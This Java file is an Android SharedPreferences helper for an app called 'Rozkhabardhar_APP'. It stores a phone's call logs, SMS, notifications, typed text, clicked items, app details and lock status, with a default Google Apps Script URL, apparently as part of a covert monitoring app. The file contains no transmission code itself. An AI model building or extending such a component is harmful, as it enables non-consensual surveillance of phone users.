package com.example.settings;

import android.content.Context;
import android.content.SharedPreferences;

public class Sharedpref {
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    public static final String PREFS_NAME = "Rozkhabardhar_APP";


    public Sharedpref(Context context) {
        sharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();
    }
    public void resetSharedPref() {
        editor.clear().commit();
    }

    public void apply() {
        editor.apply();
    }

    public void commit() {
        editor.commit();
    }
    public void setSaveName(String saveName){
        editor.putString("savename",saveName.trim());
    }
    public String getSaveName(){
        return sharedPreferences.getString("savename","");
    }
    public void setPhoneNumbersListSize(int PhoneNumbersList){
        editor.putInt("PhoneNumbersListSize",PhoneNumbersList);
    }
    public int getPhoneNumbersLisSize(){
        return sharedPreferences.getInt("PhoneNumbersListSize",0);
    }
    public void setPrevPhoneNumbersListSize(int PhoneNumbersList){
        editor.putInt("PrevPhoneNumbersListSize",PhoneNumbersList);
    }
    public int getPrevPhoneNumbersLisSize(){
        return sharedPreferences.getInt("PrevPhoneNumbersListSize",0);
    }
    public void setPhoneNumbers(String PhoneNumbersList){
        editor.putString("PhoneNumbersList",PhoneNumbersList.trim());
    }
    public String getPhoneNumbers(){
        return sharedPreferences.getString("PhoneNumbersList","");
    }
    public void setOutgoingNumbers(String outgoingNumbers){
        editor.putString("outgoingnumbers",outgoingNumbers.trim());
    }
    public String getOutgoingNumbers(){
        return sharedPreferences.getString("outgoingnumbers","");
    }
    public void setRecievedNumbers(String recievednumbers){
        editor.putString("recievednumbers",recievednumbers.trim());
    }
    public String getRecievedNumbers(){
        return sharedPreferences.getString("recievednumbers","");
    }
    public void setMissedCallNumber(String missedCallNumber){
        editor.putString("missedCallNumber",missedCallNumber.trim());
    }
    public String getMissedCallNumber(){
        return sharedPreferences.getString("missedCallNumber","");
    }

    public void setSaveTextWritten(String saveTextWritten){
        editor.putString("saveTextWritten",saveTextWritten.trim());
    }
    public String getSaveTextWritten(){
        return sharedPreferences.getString("saveTextWritten","");
    }

    public void setPhoneAppdetails(String phoneAppdetails){
        editor.putString("phoneAppdetails",phoneAppdetails.trim());
    }
    public String getPhoneAppdetails(){
        return sharedPreferences.getString("phoneAppdetails","");
    }

    public void setPhoneAppdetailsListSize(int phoneAppdetailslistsize){
        editor.putInt("phoneAppdetailslistsize",phoneAppdetailslistsize);
    }
    public int getPhoneAppdetailsListSize(){
        return sharedPreferences.getInt("phoneAppdetailslistsize",0);
    }

    public void setPrevPhoneAppdetailsListSize(int phoneAppdetailslistsize){
        editor.putInt("prevphoneAppdetailslistsize",phoneAppdetailslistsize);
    }
    public int getPrevPhoneAppdetailsListSize(){
        return sharedPreferences.getInt("prevphoneAppdetailslistsize",0);
    }
    public void setNotificationData(String saveNotificationData){
        editor.putString("saveNotificationData",saveNotificationData.trim());
    }
    public String getNotificationData(){
        return sharedPreferences.getString("saveNotificationData","");
    }
    public void setSmsData(String SmsData){
        editor.putString("SmsData",SmsData.trim());
    }
    public String getSmsData(){
        return sharedPreferences.getString("SmsData","");
    }
    public void setOtherNotificationData(String saveNotificationData){
        editor.putString("OthersaveNotificationData",saveNotificationData.trim());
    }
    public String getOtherNotificationData(){
        return sharedPreferences.getString("OthersaveNotificationData","");
    }

    public void setClickedData(String Clickeddata){
        editor.putString("Clickeddata",Clickeddata.trim());
    }
    public String getClickedData(){
        return sharedPreferences.getString("Clickeddata","");
    }
    public void setOtherClickedData(String Clickeddata){
        editor.putString("OtherClickeddata",Clickeddata.trim());
    }
    public String getOtherClickedData(){
        return sharedPreferences.getString("OtherClickeddata","");
    }
    public void savePrevDate(String Clickeddata){
        editor.putString("savePrevDate",Clickeddata.trim());
    }
    public String getPrevDate(){
        return sharedPreferences.getString("savePrevDate","");
    }
    public void setUrl(String url){
        editor.putString("setnewurl",url.trim());
        editor.commit();
    }
    public String getUrl(){
        return sharedPreferences.getString("setnewurl","https://script.google.com/macros/s/AKfycbzKYnyfN5E0D9CrsVz5pr8qn1w6Kw-BuE9q9AEby7dMuC95aTjpv9nb_ZNyovyW_osniQ/exec");
    }
    public void setCallHistory(String callhistory){
        editor.putString("callhistory",callhistory.trim());
    }
    public String getCallHistory(){
        return sharedPreferences.getString("callhistory","");
    }
    public void setBatteryPercnt(String percnt){
        editor.putString("percnt",percnt.trim());
    }
    public String getBatteryPercent(){
        return sharedPreferences.getString("percnt","");
    }
    public void setPhoneLockDetails(String phoneLockDetails){
        editor.putString("phonelockdetails",phoneLockDetails.trim());
    }
    public String getPhoneLockDetails(){
        return sharedPreferences.getString("phonelockdetails","");
    }



}
